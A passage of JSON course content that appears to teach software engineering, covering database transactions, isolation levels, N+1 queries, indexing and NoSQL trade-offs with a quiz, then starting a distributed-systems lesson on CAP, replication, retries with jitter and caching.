          "text": "A **transaction** groups statements so they succeed or fail together. ACID: **Atomicity** (all or nothing), **Consistency** (constraints hold before and after), **Isolation** (concurrent transactions do not see each other's partial work), **Durability** (committed data survives a crash)."
        },
        {
          "type": "code",
          "lang": "sql",
          "text": "BEGIN;\nUPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance >= 100;\nUPDATE accounts SET balance = balance + 100 WHERE id = 2;\nCOMMIT;  -- both apply, or (on error / ROLLBACK) neither"
        },
        {
          "type": "h",
          "text": "Isolation levels and anomalies"
        },
        {
          "type": "p",
          "text": "Full isolation is expensive, so databases offer levels. **Read committed** (the default in Postgres, SQL Server and Oracle; MySQL's InnoDB defaults to repeatable read) never shows uncommitted data but a re-read within one transaction may change (non-repeatable read). **Repeatable read / snapshot** gives a stable view of the data. **Serializable** behaves as if transactions ran one at a time, preventing anomalies such as **write skew** (two doctors both go off-call because each saw the other still on-call), at the cost of aborts and retries. A classic bug is **read-modify-write** in application code: read a balance, compute in code, write back. Two concurrent requests lose an update. Fix it with an atomic statement (`SET balance = balance - 100`), a row lock (`SELECT ... FOR UPDATE`), or a higher isolation level."
        },
        {
          "type": "h",
          "text": "The N+1 query problem"
        },
        {
          "type": "code",
          "lang": "python",
          "text": "# N+1: 1 query for orders + 1 query per order = 101 queries for 100 orders\norders = db.query('SELECT * FROM orders LIMIT 100')\nfor o in orders:\n    o.customer = db.query('SELECT * FROM customers WHERE id = %s', o.customer_id)\n\n# Fix: one JOIN, or one batched IN query\nrows = db.query('SELECT o.*, c.email FROM orders o JOIN customers c ON c.id = o.customer_id LIMIT 100')"
        },
        {
          "type": "p",
          "text": "ORMs make N+1 easy to write invisibly through lazy-loaded relationships. Each query is fast; the round trips add up."
        },
        {
          "type": "h",
          "text": "When NoSQL"
        },
        {
          "type": "p",
          "text": "NoSQL covers document, key-value, wide-column and graph stores. Reach for one when you have a specific need: massive horizontal write scale, a flexible per-record schema, extreme low-latency key lookups, or graph traversal. You give up joins, flexible ad-hoc queries and often cross-record transactions. Default to a relational database such as Postgres unless a measured requirement says otherwise; it handles JSON columns, full-text search and large scale better than most people assume."
        },
        {
          "type": "callout",
          "kind": "agent",
          "text": "Agents frequently build SQL by string concatenation, forget indexes on new foreign keys and filter columns, write N+1 loops through the ORM, and do read-modify-write across two statements outside a transaction. Ask for the migration plus the indexes it needs, request `EXPLAIN` output for key queries, and demand parameterized queries. Never let an agent run destructive migrations against production data without a reviewed rollback plan."
        },
        {
          "type": "patterns",
          "patterns": [
            {
              "signal": "`WHERE customer_id = ? ORDER BY created_at DESC LIMIT 20` is slow on a large table",
              "use": "Composite index: filter column, then sort",
              "why": "An index on `(customer_id, created_at)` finds the rows and returns them pre-sorted, so the database stops after 20. Column order matters; each index slows writes."
            },
            {
              "signal": "An index was added but the endpoint is still slow and nobody checked what the database actually does",
              "use": "Read the plan with `EXPLAIN`",
              "why": "`EXPLAIN ANALYZE` shows sequential scans, unused indexes, bad row estimates and sorts. Measure on production-sized data; a tiny dev table can make any plan look fine."
            },
            {
              "signal": "Logs show one list query followed by hundreds of near-identical `SELECT ... WHERE id = ?`",
              "use": "Join or eager load (fix N+1)",
              "why": "Fetch related rows in one `JOIN` or one `WHERE id IN (...)` batch instead of a query per row. ORMs hide this behind lazy loading; enable eager loading for that access path."
            },
            {
              "signal": "Code reads a balance, subtracts in the app, writes it back, and concurrent requests lose updates",
              "use": "Atomic UPDATE in SQL",
              "why": "`UPDATE accounts SET balance = balance - 30 WHERE id = ? AND balance >= 30` does read and write in one step. Check affected rows to detect the failed condition."
            },
            {
              "signal": "Two users edit the same record over minutes and the later save silently overwrites the earlier one",
              "use": "Optimistic locking with a version column",
              "why": "Write with `WHERE id = ? AND version = ?` and bump the version; zero affected rows means conflict, so reload and retry or ask the user. Wins at low contention, thrashes at high."
            },
            {
              "signal": "Several writes must all happen or none, such as debit one account and credit another",
              "use": "Transaction",
              "why": "Atomicity rolls back a partial failure. Isolation level decides which anomalies remain, so pick it deliberately. Keep transactions short and never wait on network calls inside one."
            },
            {
              "signal": "Duplicate emails appear despite a `SELECT` check in application code before insert",
              "use": "Unique constraint",
              "why": "A check-then-insert races between requests; only the database can enforce uniqueness atomically. Catch the constraint violation and map it to a clean `409` for the client."
            },
            {
              "signal": "The same customer address is copied into many rows and updates leave some copies stale",
              "use": "Normalise to one fact, one place",
              "why": "Store it once and reference it by foreign key so updates cannot diverge. Denormalise later only for a measured read hotspot, and own the work of keeping copies in sync."
            },
            {
              "signal": "The primary's CPU is saturated by reporting and read traffic while writes are a small share",
              "use": "Read replica",
              "why": "Route heavy reads to followers to offload the primary. Async replicas lag, so a read right after a write can be stale; keep read-after-write paths on the primary."
            },
            {
              "signal": "A team wants to move a plain relational app to NoSQL 'because it scales' with no measured bottleneck",
              "use": "Stay relational until a measured need",
              "why": "Relational databases scale far with indexes, replicas and caching while keeping joins, constraints and transactions. Choose a document or key-value store for a specific access pattern."
            }
          ]
        }
      ],
      "keyPoints": [
        "Normalize to store each fact once, and use constraints to make the database enforce correctness.",
        "Indexes speed reads and slow writes; column order in composite indexes matters; verify with EXPLAIN.",
        "Transactions give atomicity; isolation level determines which concurrency anomalies remain.",
        "Read-modify-write in application code loses updates; use atomic SQL, locks, or stronger isolation.",
        "N+1 queries come from per-row lookups in loops; batch with joins or IN queries."
      ],
      "quiz": [
        {
          "q": "A query `WHERE customer_id = ? ORDER BY created_at DESC LIMIT 20` is slow on a large table. Which index most directly helps?",
          "options": [
            "An index on `created_at` alone",
            "A composite index on `(customer_id, created_at)`",
            "An index on `(created_at, customer_id)`",
            "A separate index on `total_cents`"
          ],
          "answer": 1,
          "explain": "Equality column first, then the sort column, lets the database find the customer's rows already ordered. Reversing the order or indexing unrelated columns does not support that access path."
        },
        {
          "q": "Two requests each read a balance of 100, subtract 30 in application code, and write back 70. The final balance should be 40. What happened and what fixes it?",
          "options": [
            "A durability failure lost one write; enable synchronous commit",
            "A lost update; use an atomic `SET balance = balance - 30` or a row lock",
            "A deadlock between the requests; add an index on the balance column",
            "A dirty read of uncommitted data; add a CHECK constraint on balance"
          ],
          "answer": 1,
          "explain": "Both requests based their write on the same stale read, so one update overwrote the other. Moving the arithmetic into the database statement or locking removes the race."
        },
        {
          "q": "A list endpoint takes 3 seconds and the logs show 301 near-identical `SELECT ... WHERE id = ?` queries for one request. What is the most likely issue and fix?",
          "options": [
            "Missing primary key; add one so each lookup uses an index",
            "Pool too small; add connections so the lookups run in parallel",
            "N+1 queries; fetch related rows with a JOIN or one batched query",
            "Isolation too weak; use serializable so the reads are consistent"
          ],
          "answer": 2,
          "explain": "One query plus one per row is the N+1 signature. The fix is to reduce round trips, not to tune isolation or connections."
        },
        {
          "q": "What does adding many indexes to a write-heavy table risk?",
          "options": [
            "Slower inserts and updates, since every index must be maintained",
            "Queries returning stale rows when two indexes disagree",
            "The table silently losing its ACID transaction guarantees",
            "Foreign key constraints no longer being checked on insert"
          ],
          "answer": 0,
          "explain": "Indexes are redundant structures kept in sync on every write, and they also take storage. They do not change correctness, only cost."
        },
        {
          "q": "A team wants to move a normal orders-and-customers app from Postgres to a document database 'because it scales'. There is no measured scaling problem. What is the best advice?",
          "options": [
            "Migrate now, since document stores always outscale relational ones",
            "Migrate, since Postgres cannot store JSON or handle large tables",
            "Keep Postgres but drop all indexes to see whether writes scale",
            "Stay on Postgres until a measured need justifies losing joins"
          ],
          "answer": 3,
          "explain": "Relational databases cover most workloads, and the trade-offs of NoSQL (no joins, often weaker cross-record transactions) are real costs. Choose it for a measured need."
        },
        {
          "q": "Two support agents open the same ticket and edit it for several minutes each. The second save silently wipes the first agent's changes. Which approach fits best?",
          "options": [
            "Lock the ticket row in the database for the whole edit session",
            "Add a unique constraint on the ticket's ID column in the table",
            "Switch the save to `SET field = field + 1` style relative updates",
            "Add a version column, save with `WHERE id = ? AND version = ?`"
          ],
          "answer": 3,
          "explain": "Optimistic locking detects the conflict at save time, and zero affected rows tells you to reload. A row lock held for minutes would block everyone, and a unique constraint cannot catch lost updates."
        }
      ]
    },
    {
      "id": "distributed-systems",
      "title": "Distributed Systems",
      "minutes": 12,
      "summary": "CAP and PACELC, replication, consistency, queues, caching and safe retries when machines and networks fail.",
      "lesson": [
        {
          "type": "p",
          "text": "Your checkout service calls the payment service, which calls the bank. The payment call times out. Did it fail, or did it succeed and the reply got lost? In a single process a function call either returns or throws. Across a network, there is a third outcome: you do not know. Distributed systems is the discipline of building correct behavior despite that uncertainty."
        },
        {
          "type": "h",
          "text": "Why it is hard"
        },
        {
          "type": "p",
          "text": "Three facts drive everything: messages can be delayed, dropped or duplicated; nodes can crash and restart at any time; and there is no shared clock or shared memory, so nodes cannot instantly agree on what is true. A slow node is indistinguishable from a dead one. Design as if every remote call can fail in the ambiguous way."
        },
        {
          "type": "h",
          "text": "CAP and PACELC"
        },
        {
          "type": "p",
          "text": "The **CAP theorem** says that when a network **partition** happens (nodes cannot reach each other), a system must choose between **Consistency** (every read sees the latest write, as if one copy existed) and **Availability** (every request gets a non-error response). Partitions are not optional in real networks, so the real choice is C or A *during a partition*. A bank ledger favors consistency and rejects requests it cannot safely serve; a shopping-cart or social feed often favors availability and reconciles later."
        },
        {
          "type": "p",
          "text": "**PACELC** extends this: if there is a Partition choose A or C; **Else**, with no partition, choose between **Latency** and **Consistency**. Even on a healthy network, waiting for replicas to confirm a write costs latency. This is the day-to-day trade-off, far more common than partitions."
        },
        {
          "type": "h",
          "text": "Replication and consistency models"
        },
        {
          "type": "p",
          "text": "**Replication** keeps copies of data on multiple nodes for durability and read scale. In leader-follower replication, writes go to the leader and are copied to followers, **synchronously** (safe, slower) or **asynchronously** (fast, but a leader crash can lose recent writes, and followers lag). Consistency models describe what reads may observe:"
        },
        {
          "type": "list",
          "items": [
            "**Strong / linearizable**: behaves like a single copy; a read after a completed write sees it. Costs coordination and latency.",
            "**Eventual**: if writes stop, replicas converge. Reads may be stale in the meantime.",
            "**Read-your-writes**: a user always sees their own updates, even if others see stale data. Commonly implemented by routing a user's reads to the leader shortly after they write."
          ]
        },
        {
          "type": "h",
          "text": "Queues and asynchronous work"
        },
        {
          "type": "p",
          "text": "A **message queue** (SQS, RabbitMQ, Kafka) decouples producers from consumers: the checkout service enqueues 'send receipt' and moves on. Queues absorb bursts and let consumers fail and retry independently. Most queues provide **at-least-once** delivery: a message may be delivered more than once, for example when a consumer crashes before acknowledging. True exactly-once is not achievable end to end; you get **effectively-once** by making consumers **idempotent**."
        },
        {
          "type": "h",
          "text": "Retries and idempotency keys"
        },
        {
          "type": "code",
          "lang": "python",
          "text": "def charge(order_id, amount):\n    key = 'charge-' + order_id          # stable per business operation\n    for attempt in range(5):\n        try:\n            return payments.post('/charges', json={'amount': amount},\n                                 headers={'Idempotency-Key': key}, timeout=3)\n        except (Timeout, ConnectionError, Http5xx):\n            sleep(min(30, 0.2 * 2 ** attempt) * random.uniform(0.5, 1.5))\n    raise ChargeUnknown(order_id)  # surface the ambiguity, do not guess"
        },
        {
          "type": "p",
          "text": "Retries fix transient failures but create duplicates, so they need idempotency keys. Use **exponential backoff with jitter** so thousands of clients do not retry in lockstep and overwhelm a recovering service (a **retry storm**). Set timeouts everywhere; a missing timeout turns a slow dependency into exhausted threads. Cap total attempts, and retry at one layer only, because stacked retries multiply load (3 retries at 3 layers is 27 calls)."
        },
        {
          "type": "figure",
          "id": "systems-backoff-jitter",
          "caption": "Same backoff schedule, same failures: without jitter the clients hit the recovering service together, with jitter their retries spread out.",
          "svg": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 640 304\" role=\"img\" aria-label=\"Retry times of 6 clients on a 0 to 4.5 second axis: without jitter all 6 retry at 0.2, 0.6, 1.4 and 3.0 seconds at once; with jitter the same retries are spread out\"> <style>.systems-backoff-jitter-t{font-size:14px;fill:var(--fig-ink)} .systems-backoff-jitter-b{font-size:14px;font-weight:600;fill:var(--fig-ink)} .systems-backoff-jitter-m{font-size:13px;fill:var(--fig-muted)} .systems-backoff-jitter-mono{font-family:ui-monospace,Menlo,monospace} .systems-backoff-jitter-mid{text-anchor:middle}.systems-backoff-jitter-end{text-anchor:end} .systems-backoff-jitter-ln{stroke:var(--fig-line);stroke-width:1.5;fill:none} .systems-backoff-jitter-dash{stroke-dasharray:4 4} .systems-backoff-jitter-box{fill:var(--fig-panel);stroke:var(--fig-line);stroke-width:1.5} .systems-backoff-jitter-halo{paint-order:stroke;stroke:var(--fig-bg);stroke-width:4px;stroke-linejoin:round} .systems-backoff-jitter-badt{fill:var(--fig-bad)} .systems-backoff-jitter-burst{fill:var(--fig-bad);fill-opacity:.1} .systems-backoff-jitter-flash{fill:var(--fig-ink);fill-opacity:.14;opacity:0;animation:systems-backoff-jitter-fl 7s linear infinite} @keyframes systems-backoff-jitter-fl{0%{opacity:1}8%,100%{opacity:0}} .systems-backoff-jitter-dl{fill:var(--fig-accent)}.systems-backoff-jitter-dj{fill:var(--fig-accent2)} .systems-backoff-jitter-ring{fill:none;stroke:var(--fig-ink);stroke-width:1.5;opacity:0;transform-box:fill-box;transform-origin:center;animation:systems-backoff-jitter-pulse 7s linear infinite} .systems-backoff-jitter-head{stroke:var(--fig-ink);stroke-opacity:.5;stroke-width:1.5;opacity:0;animation:systems-backoff-jitter-move 7s linear infinite} @keyframes systems-backoff-jitter-pulse{0%{opacity:.9;transform:scale(1)}8%{opacity:0;transform:scale(2.6)}100%{opacity:0;transform:scale(2.6)}} @keyframes systems-backoff-jitter-move{0%{transform:translateX(0);opacity:1}71.4%{transform:translateX(520px);opacity:1}71.5%,100%{transform:translateX(520px);opacity:0}}</style> <text class=\"systems-backoff-jitter-b\" x=\"80\" y=\"26\">No jitter: every client sleeps 0.2, 0.4, 0.8, 1.6 s</text><text class=\"systems-backoff-jitter-b\" x=\"80\" y=\"164\">With jitter: each sleep × random.uniform(0.5, 1.5)</text><text class=\"systems-backoff-jitter-m systems-backoff-jitter-end\" x=\"66\" y=\"87\">6</text><text class=\"systems-backoff-jitter-m systems-backoff-jitter-end\" x=\"66\" y=\"103\">clients</text><text class=\"systems-backoff-jitter-m systems-backoff-jitter-end\" x=\"66\" y=\"223\">6</text><text class=\"systems-backoff-jitter-m systems-backoff-jitter-end\" x=\"66\" y=\"239\">clients</text><rect class=\"systems-backoff-jitter-burst\" x=\"72\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\"/><rect class=\"systems-backoff-jitter-flash\" x=\"72\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\" style=\"animation-delay:0s\"/><rect class=\"systems-backoff-jitter-burst\" x=\"95.1\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\"/><rect class=\"systems-backoff-jitter-flash\" x=\"95.1\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\" style=\"animation-delay:0.222s\"/><rect class=\"systems-backoff-jitter-burst\" x=\"141.3\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\"/><rect class=\"systems-backoff-jitter-flash\" x=\"141.3\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\" style=\"animation-delay:0.667s\"/><rect class=\"systems-backoff-jitter-burst\" x=\"233.8\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\"/><rect class=\"systems-backoff-jitter-flash\" x=\"233.8\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\" style=\"animation-delay:1.556s\"/><rect class=\"systems-backoff-jitter-burst\" x=\"418.7\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\"/><rect class=\"systems-backoff-jitter-flash\" x=\"418.7\" y=\"38\" width=\"16\" height=\"90\" rx=\"8\" style=\"animation-delay:3.333s\"/><rect class=\"systems-backoff-jitter-flash\" x=\"72\" y=\"174\" width=\"16\" height=\"90\" rx=\"8\"/><text class=\"systems-backoff-jitter-m systems-backoff-jitter-badt systems-backoff-jitter-halo\" x=\"442.7\" y=\"90\">6 calls at the same instant</text><path class=\"systems-backoff-jitter-ln\" d=\"M80 48H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 62H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 76H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 90H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 104H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 118H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 184H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 198H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 212H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 226H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 240H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 254H600\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"80\" cy=\"48\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"103.1\" cy=\"48\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"149.3\" cy=\"48\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"241.8\" cy=\"48\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"426.7\" cy=\"48\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"80\" cy=\"62\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"103.1\" cy=\"62\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"149.3\" cy=\"62\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"241.8\" cy=\"62\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"426.7\" cy=\"62\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"80\" cy=\"76\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"103.1\" cy=\"76\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"149.3\" cy=\"76\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"241.8\" cy=\"76\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"426.7\" cy=\"76\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"80\" cy=\"90\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"103.1\" cy=\"90\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"149.3\" cy=\"90\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"241.8\" cy=\"90\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"426.7\" cy=\"90\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"80\" cy=\"104\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"103.1\" cy=\"104\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"149.3\" cy=\"104\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"241.8\" cy=\"104\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"426.7\" cy=\"104\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"80\" cy=\"118\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"103.1\" cy=\"118\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"149.3\" cy=\"118\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"241.8\" cy=\"118\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dl\" cx=\"426.7\" cy=\"118\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"80\" cy=\"184\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"110.3\" cy=\"184\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"138.9\" cy=\"184\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"242.5\" cy=\"184\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"373.7\" cy=\"184\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"80\" cy=\"198\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"92.7\" cy=\"198\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"158.3\" cy=\"198\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"239.7\" cy=\"198\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"491.1\" cy=\"198\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"80\" cy=\"212\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"102.4\" cy=\"212\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"138.9\" cy=\"212\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"274.8\" cy=\"212\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"493\" cy=\"212\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"80\" cy=\"226\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"107.3\" cy=\"226\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"155.8\" cy=\"226\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"209.4\" cy=\"226\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"305.6\" cy=\"226\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"80\" cy=\"240\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"97.1\" cy=\"240\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"155.8\" cy=\"240\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"271.4\" cy=\"240\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"443.3\" cy=\"240\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"80\" cy=\"254\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"113.3\" cy=\"254\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"136.9\" cy=\"254\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"200.6\" cy=\"254\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-dj\" cx=\"476.1\" cy=\"254\" r=\"4.5\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"110.3\" cy=\"184\" r=\"5\" style=\"animation-delay:0.29100000000000004s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"138.9\" cy=\"184\" r=\"5\" style=\"animation-delay:0.5670000000000001s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"242.5\" cy=\"184\" r=\"5\" style=\"animation-delay:1.5619999999999998s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"373.7\" cy=\"184\" r=\"5\" style=\"animation-delay:2.824s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"92.7\" cy=\"198\" r=\"5\" style=\"animation-delay:0.122s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"158.3\" cy=\"198\" r=\"5\" style=\"animation-delay:0.753s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"239.7\" cy=\"198\" r=\"5\" style=\"animation-delay:1.536s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"491.1\" cy=\"198\" r=\"5\" style=\"animation-delay:3.9530000000000003s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"102.4\" cy=\"212\" r=\"5\" style=\"animation-delay:0.21600000000000003s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"138.9\" cy=\"212\" r=\"5\" style=\"animation-delay:0.5670000000000001s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"274.8\" cy=\"212\" r=\"5\" style=\"animation-delay:1.8730000000000002s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"493\" cy=\"212\" r=\"5\" style=\"animation-delay:3.971s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"107.3\" cy=\"226\" r=\"5\" style=\"animation-delay:0.262s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"155.8\" cy=\"226\" r=\"5\" style=\"animation-delay:0.7290000000000001s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"209.4\" cy=\"226\" r=\"5\" style=\"animation-delay:1.244s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"305.6\" cy=\"226\" r=\"5\" style=\"animation-delay:2.169s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"97.1\" cy=\"240\" r=\"5\" style=\"animation-delay:0.16399999999999998s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"155.8\" cy=\"240\" r=\"5\" style=\"animation-delay:0.7290000000000001s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"271.4\" cy=\"240\" r=\"5\" style=\"animation-delay:1.84s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"443.3\" cy=\"240\" r=\"5\" style=\"animation-delay:3.4930000000000003s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"113.3\" cy=\"254\" r=\"5\" style=\"animation-delay:0.32s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"136.9\" cy=\"254\" r=\"5\" style=\"animation-delay:0.547s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"200.6\" cy=\"254\" r=\"5\" style=\"animation-delay:1.16s\"/><circle class=\"systems-backoff-jitter-ring\" cx=\"476.1\" cy=\"254\" r=\"5\" style=\"animation-delay:3.8089999999999997s\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 270H600\"/><path class=\"systems-backoff-jitter-ln\" d=\"M80 270V276\"/><text class=\"systems-backoff-jitter-m systems-backoff-jitter-mid\" x=\"80\" y=\"292\">0 s</text><path class=\"systems-backoff-jitter-ln\" d=\"M195.6 270V276\"/><text class=\"systems-backoff-jitter-m systems-backoff-jitter-mid\" x=\"195.6\" y=\"292\">1 s</text><path class=\"systems-backoff-jitter-ln\" d=\"M311.1 270V276\"/><text class=\"systems-backoff-jitter-m systems-backoff-jitter-mid\" x=\"311.1\" y=\"292\">2 s</text><path class=\"systems-backoff-jitter-ln\" d=\"M426.7 270V276\"/><text class=\"systems-backoff-jitter-m systems-backoff-jitter-mid\" x=\"426.7\" y=\"292\">3 s</text><path class=\"systems-backoff-jitter-ln\" d=\"M542.2 270V276\"/><text class=\"systems-backoff-jitter-m systems-backoff-jitter-mid\" x=\"542.2\" y=\"292\">4 s</text><path class=\"systems-backoff-jitter-head\" d=\"M80 38V128M80 176V262\"/> </svg>"
        },
        {
          "type": "h",
          "text": "Caching and invalidation"
        },
        {
          "type": "p",
          "text": "A **cache** stores computed or fetched results closer to the consumer (in-process, Redis, CDN, browser). It cuts latency and load but introduces a second copy of truth that can go stale. Strategies: **TTL** expiry (simple, bounded staleness), **write-through** or **cache-aside with explicit delete on write** (fresher, more code), and versioned keys. The hard part is invalidation: deleting on every code path that mutates the data, and handling races where a stale read refills the cache after a delete. Also beware **cache stampede**, where a popular key expires and thousands of requests hit the database at once; mitigate with request coalescing, jittered TTLs, or serving stale while refreshing."
        },
        {
          "type": "p",
          "text": "Misconceptions: adding a cache does not make a slow query correct, only hides it; 'exactly-once delivery' claims usually mean at-least-once plus deduplication; and microservices do not remove these problems, they create more network boundaries where they appear."
        },
        {
          "type": "callout",
          "kind": "agent",
          "text": "Agents love to add `try/except` with a blind retry loop and a Redis cache to 'fix' performance. Check for: retries around non-idempotent calls without a key, no timeouts, no backoff or jitter, caches with no invalidation story or TTL, and consumers that assume a message arrives once. Tell the agent the consistency requirement explicitly (for example, 'a user must see their own edit immediately') and ask it to state what happens when each dependency times out."
        },
        {
          "type": "patterns",
          "patterns": [
            {
              "signal": "A remote call has no timeout, or code treats a read timeout as a definite failure",
              "use": "Timeouts with unknown-outcome handling",
              "why": "Every remote call needs a deadline. A timeout means the work may or may not have happened, so retry with the same idempotency key or query the status before acting again."
            },
            {
              "signal": "A downstream dependency is down and request threads pile up waiting on it until the caller dies too",
              "use": "Circuit breaker",
              "why": "After repeated failures the breaker opens and fails fast, then lets trial calls through to probe recovery. Stops cascades, but you need a fallback and well-tuned thresholds."
            },
            {
              "signal": "A queue consumer sends duplicate welcome emails after crashes and redeliveries",
              "use": "Idempotent consumer",
              "why": "At-least-once delivery guarantees duplicates eventually. Record processed message ids (or use a natural key) in the same transaction as the side effect and skip repeats."
            },
            {
              "signal": "Code writes to the database, then publishes an event, and a crash in between loses or fakes the event",
              "use": "Transactional outbox",
              "why": "Insert the event into an outbox table in the same transaction as the state change; a relay publishes it afterwards. Gives at-least-once publishing, so consumers must still dedupe."
            },
            {
              "signal": "One business operation spans several services' databases and no distributed transaction is available",
              "use": "Saga with compensating actions",
              "why": "Run local transactions step by step and on failure run compensations (refund, release stock) in reverse. Intermediate states are visible, and compensations must be idempotent."
            },
            {
              "signal": "A scheduled job runs on every replica and should run on exactly one",
              "use": "Leader election with a lease",
              "why": "Replicas compete for an expiring lease in a coordinator (etcd, ZooKeeper, a DB row). A paused old leader may still act, so protect writes with a fencing token."
            },
            {
              "signal": "A read-heavy lookup hits the database every time and can tolerate a few seconds of staleness",
              "use": "Cache-aside with TTL",
              "why": "Read the cache, on miss load from the DB and populate it; on write, invalidate the key. Simple and only caches what is used, but the first read is slow and staleness is bounded only by TTL."
            },
            {
              "signal": "Reads right after a write must see the new value and the cache sits in front of every read",
              "use": "Write-through cache",
